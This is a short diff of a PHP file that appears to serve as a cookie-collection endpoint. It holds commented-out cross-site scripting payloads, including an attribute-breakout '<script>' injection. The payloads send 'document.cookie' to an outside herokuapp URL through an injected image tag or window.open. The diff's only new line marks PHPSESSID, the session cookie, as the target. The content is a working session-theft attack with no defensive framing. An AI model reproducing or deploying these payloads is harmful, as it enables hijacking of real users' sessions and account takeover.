@@ -40,6 +40,7 @@ if (isset($_GET["abc"])) {
 //window.open( "https://yeuvephp.herokuapp.com/abc.php?abc=" +document.cookie, "_blank");
     //document.querySelector(".example");
 //var elem = document.createElement("img");elem.setAttribute("src", 'https://yeuvephp.herokuapp.com/abc.php?abc=' + document.cookie );$("footer").after(elem);
-  //  hay!"><script>var elem = document.createElement("img");elem.setAttribute("src", 'https://yeuvephp.herokuapp.com/abc.php?abc=' + document.cookie );$("footer").after(elem);</script>
+ //USER PHPSESSID
+    //  hay!"><script>var elem = document.createElement("img");elem.setAttribute("src", 'https://yeuvephp.herokuapp.com/abc.php?abc=' + document.cookie );$("footer").after(elem);</script>
 }
 ?>
